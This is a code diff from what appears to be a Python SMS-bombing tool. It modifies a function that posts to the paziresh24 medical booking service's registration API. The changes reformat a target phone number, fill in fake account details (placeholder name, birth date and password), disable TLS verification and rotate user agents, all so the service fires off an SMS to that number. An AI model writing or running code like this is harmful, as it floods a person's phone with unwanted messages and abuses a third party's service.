@@ -66,24 +66,33 @@ def send_service_safe(service, phone):
 
 def paziresh24(phone):
     try:
-        # استفاده از فرمت +98 برای پذیرش 24
-        formatted_phone = phone if phone.startswith("+98") else f"+98{phone.replace('+98', '').lstrip('0')}"
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"
         
         headers = {
             "Accept": "application/json, text/plain, */*",
-            "accept-timezone": "Asia/Tehran",
+            "accept-timezone": "Asia/Tehran", 
             "content-type": "application/json; charset=utf-8",
             "User-Agent": random.choice(user_agents),
         }
         
+        # payload کامل‌تر با فیلدهای مورد نیاز
         payload = {
-            "mobile": formatted_phone  # با فرمت +989123456789
+            "mobile": formatted_phone,
+            "name": "کاربر",
+            "last_name": "تست", 
+            "gender": "male",
+            "national_code": "",
+            "email": "",
+            "birth_date": "1370-01-01",
+            "password": "Test1234",
+            "password_confirmation": "Test1234"
         }
         
         response = requests.post(
             "https://apigw.paziresh24.com/gozargah/register",
             json=payload,
-            headers=headers,
+            headers=headers, 
             timeout=10,
             verify=False
         )
@@ -93,7 +102,7 @@ def paziresh24(phone):
         
         if response.status_code == 200:
             data = response.json()
-            if data.get("status") == 1:  # بررسی status به جای کد وضعیت
+            if data.get("status") == 1:
                 print(f'{g}(paziresh24) sms sent successfully!{a}')
                 return True
             else:
@@ -106,6 +115,8 @@ def paziresh24(phone):
     except Exception as e:
         print(f'{r}[!] paziresh24 exception: {e}{a}')
         return False
+
+
         
 
 
